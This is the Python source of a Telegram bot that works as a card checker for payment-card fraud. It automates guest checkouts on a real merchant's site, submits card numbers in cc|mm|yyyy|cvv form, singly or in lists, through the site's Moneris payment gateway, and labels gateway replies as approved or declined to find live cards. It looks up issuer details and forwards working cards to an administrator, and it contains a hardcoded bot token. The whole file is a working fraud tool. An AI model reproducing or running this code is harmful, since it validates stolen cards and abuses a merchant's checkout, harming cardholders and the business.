import os
import telebot
import requests
import time
from telebot import types
from retry import retry

BOT_TOKEN = "8317245523:AAGWfRVn6JoUW20_Xmbfzh7N0R8ZpPxaOVg"
ADMIN_ID = 8340881349
CHANNEL_USERNAME = ""
APPROVED_GROUP_USERNAME = ""

AUTHORIZED_USERS = {8340881349}  # Add all authorized Telegram user IDs here

bot = telebot.TeleBot(BOT_TOKEN)

class MonerisAuth:
    def __init__(self):
        self.session = requests.Session()
        self.session.trust_env = False

    def set_headers(self, referer: str):
        return {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://innovoceans.com",
            "referer": referer,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        }

    @retry(tries=3, delay=1, backoff=2)
    def main(self, card: str):
        start_time = time.time()
        cc = card.split("|")
        if len(cc) != 4:
            return [("Declined ❌", "Invalid card format - Expected cc|mm|yyyy|cvv")], round(time.time() - start_time, 2)
        try:
            headers = self.set_headers('https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html')
            self.session.get('https://innovoceans.com/Accessory/boarding-ladder-for-rib-inflatable-boats-and-dinghies.html', headers=headers, timeout=10)
            self.session.post('https://innovoceans.com/index.php?route=checkout/cart/add', headers=headers, data={'quantity': '1', 'product_id': '744'}, timeout=10)
            headers['referer'] = 'https://innovoceans.com/index.php?route=checkout/checkout'
            self.session.get('https://innovoceans.com/index.php?route=checkout/checkout', headers=headers, timeout=10)
            headers['referer'] = 'https://innovoceans.com/index.php?route=checkout/guest'
            self.session.get('https://innovoceans.com/index.php?route=checkout/guest', headers=headers, timeout=10)

            guest_data = {
                'customer_group_id': '1',
                'firstname': 'Lucas',
                'lastname': 'Lorenzo',
                'email': 'valerie.jenkins@gmail.com',
                'telephone': '8194544131',
                'fax': '',
                'company': 'OrganiMp',
                'address_1': 'E Little York Rd 7912',
                'address_2': '',
                'city': 'Norman',
                'postcode': '10010',
                'country_id': '223',
                'zone_id': '3624',
                'shipping_address': '1',
            }
            self.session.post('https://innovoceans.com/index.php?route=checkout/guest/save', headers=headers, data=guest_data, timeout=10)
            self.session.post('https://innovoceans.com/index.php?route=checkout/shipping_method/save', headers=headers, data={'shipping_method': 'pickup.pickup', 'comment': ''}, timeout=10)
            self.session.post('https://innovoceans.com/index.php?route=checkout/payment_method/save', headers=headers, data={'payment_method': 'moneris', 'comment': '', 'agree': '1'}, timeout=10)
            self.session.get('https://innovoceans.com/index.php?route=checkout/confirm', headers=headers, timeout=10)
            payment_data = {
                'number': cc[0],
                'cvc': cc[3],
                'exp_month': cc[1],
                'exp_year': cc[2],
                'card_name': 'Mario Lopez',
                'card_address': 'E Little York Rd 7912',
                'card_zip': '10010',
                'card_type': 'visa' if cc[0].startswith('4') else 'mastercard' if cc[0].startswith('5') else 'amex' if cc[0].startswith('3') else 'discover'
            }
            response = self.session.post('https://innovoceans.com/index.php?route=payment/moneris/send', headers=headers, data=payment_data, timeout=10)
            elapsed = round(time.time() - start_time, 2)
            rtext = response.text.lower()
            responses = []

            if '{"error"' in rtext:
                error_msg = response.json().get('error', 'Unknown error')
                if "declined           * refer call to issue=" in rtext:
                    responses.append(("Declined ❌", "Card was declined - Call issuer"))
                if "invalid card expiry" in rtext:
                    responses.append(("Declined ❌", "Invalid card expiry date"))
                if "invalid card cvv" in rtext or "card's security code is incorrect" in rtext:
                    responses.append(("Approved ✅", "AVS/CVV Mismatch"))
                if ("name, address or cvv code is incorrect." in rtext or "invalid address" in rtext or "address verification failed" in rtext):
                    responses.append(("Approved ✅", "Invalid address"))
                if "funds" in rtext or "insufficient funds" in rtext:
                    responses.append(("Approved ✅", "Insufficient Funds"))
                if "transaction not permitted to cardholder" in rtext:
                    responses.append(("Declined ❌", "Transaction not permitted to cardholder"))
                if "expired card" in rtext:
                    responses.append(("Declined ❌", "Expired card"))
                if "pickup card" in rtext:
                    responses.append(("Declined ❌", "Pickup card"))
                if "suspected fraud" in rtext:
                    responses.append(("Declined ❌", "Suspected fraud"))
                if not responses:
                    responses.append(("Declined ❌", error_msg))
            else:
                responses.append(("Approved ✅", "Charged $80.00"))

            return responses, elapsed
        except requests.exceptions.Timeout:
            return [("Declined ❌", "Gateway Rejected: timeout")], round(time.time() - start_time, 2)
        except Exception:
            return [("Declined ❌", "Gateway Rejected: connection_failed")], round(time.time() - start_time, 2)
        finally:
            self.session.close()

def lookup_bin(bin_prefix: str) -> dict:
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_prefix}", timeout=15)
        data = res.json()
        if "detail" in data or "error" in data:
            return {}
        return data
    except:
        return {}

def build_card_message(card: str, status: str, status_str: str, gateway: str, bin_info: dict, time_taken: float, proxy_status: str) -> str:
    owner_link = '<a href="tg://user?id=8340881349">Spyde</a>'
    return f"""{status}
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_str}
[ϟ] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[ϟ] B𝗶𝗻 : {bin_info.get("bin", "N/A")}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {bin_info.get("country_name", "Unknown")} {bin_info.get("country_flag", "")}
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bin_info.get("bank", "Unknown")}
[ϟ] 𝗧𝘆𝗽𝗲 : {bin_info.get("brand", "Unknown")} | {bin_info.get("type", "Unknown")}
━━━━━━━━━━━━━
[ϟ] T/t : {time_taken}s | Proxy : {proxy_status}
[ϟ] 𝗢𝘄𝗻𝗲𝗿: {owner_link}
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
"""

def is_member(user_id: int) -> bool:
    try:
        mem = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if mem.status in ["member", "administrator", "creator"]:
            return True
    except:
        pass
    try:
        mem2 = bot.get_chat_member(APPROVED_GROUP_USERNAME, user_id)
        if mem2.status in ["member", "administrator", "creator"]:
            return True
    except:
        pass
    return False

def join_channel_keyboard(user_id: int) -> types.InlineKeyboardMarkup:
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("✅ Join Our Channel", url=f"https://t.me/{CHANNEL_USERNAME.strip('@')}")
    continue_button = types.InlineKeyboardButton("🔒 Continue", callback_data=f"continue_{user_id}")
    markup.add(join_button)
    markup.add(continue_button)
    return markup

def is_authorized(user_id: int) -> bool:
    return user_id in {6622603977}  # add your authorized user ids here as needed

def authorized_group_keyboard():
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton("🔐 Authorized Group", url="https://t.me/joinchat/YourGroupInviteLink")
    markup.add(join_button)
    return markup

@bot.message_handler(commands=["start"])
def start_cmd(m: types.Message):
    if is_authorized(m.from_user.id):
        bot.reply_to(m, "***_You are verified!_***\n\n*Commands:*\nUse /chk for single check\nSend .txt combos to check multiples Minimum 10 combos.", parse_mode="Markdown")
    else:
        bot.reply_to(m, "Please join our channel to access.", reply_markup=join_channel_keyboard(m.from_user.id))

@bot.message_handler(commands=["help"])
def help_cmd(m: types.Message):
    help_text = (
        "Bot usage instructions:\n"
        "- Use /chk to check a single card in cc|mm|yyyy|cvv format\n"
        "- Send a .txt file to check multiple cards (max 10 per file)\n"
        "- Only authorized users can use the bot\n"
        "- Unauthorized users will be prompted to join the authorized group/channel"
    )
    bot.reply_to(m, help_text)

@bot.message_handler(commands=["chk"])
def chk_card(m: types.Message):
    if not is_authorized(m.from_user.id):
        bot.reply_to(m, "You are not authorized. Please join the authorized group first.", reply_markup=authorized_group_keyboard())
        return
    try:
        card = m.text.split(" ", 1)[1]
        waiting_msg = bot.reply_to(m, "Your order is cooking 🔎")
        responses, elapsed = MonerisAuth().main(card)
        bin_info = lookup_bin(card[:6])
        for status, status_str in responses:
            print(f"[LOG] Status: {status} | Message: {status_str}")
            msg = build_card_message(card, status, status_str, "Moneris Charge", bin_info, elapsed, "Live ✨")
            bot.send_message(m.chat.id, msg, parse_mode="HTML", disable_web_page_preview=True)
        bot.delete_message(m.chat.id, waiting_msg.message_id)
        if any(s.lower().startswith("approved") for s, _ in responses):
            combined_msg = "\n\n".join([build_card_message(card, s, ms, "Moneris Charge", bin_info, elapsed, "Live ✨") for s, ms in responses])
            bot.send_message(ADMIN_ID, f"✅ Approved card:\n{card}\n{combined_msg}", parse_mode="HTML", disable_web_page_preview=True)
    except IndexError:
        bot.reply_to(m, "Usage: /chk cc|mm|yyyy|cvv")

@bot.message_handler(func=lambda message: message.document and message.document.mime_type == "text/plain", content_types=["document"])
def chk_file(m: types.Message):
    if not is_authorized(m.from_user.id):
        bot.reply_to(m, "You are not authorized. Please join the authorized group first.", reply_markup=authorized_group_keyboard())
        return
    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    os.makedirs("files", exist_ok=True)
    path = os.path.join("files", m.document.file_name)
    with open(path, "wb") as file:
        file.write(downloaded)
    waiting_msg = bot.reply_to(m, "Your order is cooking 🔎 Please wait...")
    count = 0
    with open(path, encoding="utf-8") as file:
        for line in file:
            if count >= 10:
                break
            card = line.strip()
            if "|" not in card:
                continue
            responses, elapsed = MonerisAuth().main(card)
            bin_info = lookup_bin(card[:6])
            for status, status_str in responses:
                print(f"[LOG] Status: {status} | Message: {status_str}")
                msg = build_card_message(card, status, status_str, "Moneris Charge", bin_info, elapsed, "Live ✨")
                bot.send_message(ADMIN_ID, msg, parse_mode="HTML", disable_web_page_preview=True)
            count += 1
    bot.delete_message(m.chat.id, waiting_msg.message_id)
    bot.reply_to(m, "Combo check done. Processed up to 10 cards.")

# No catch-all handler - bot ignores all other commands/messages

if __name__ == "__main__":
    print("Moneris Bot started...")
    bot.infinity_polling(timeout=30)
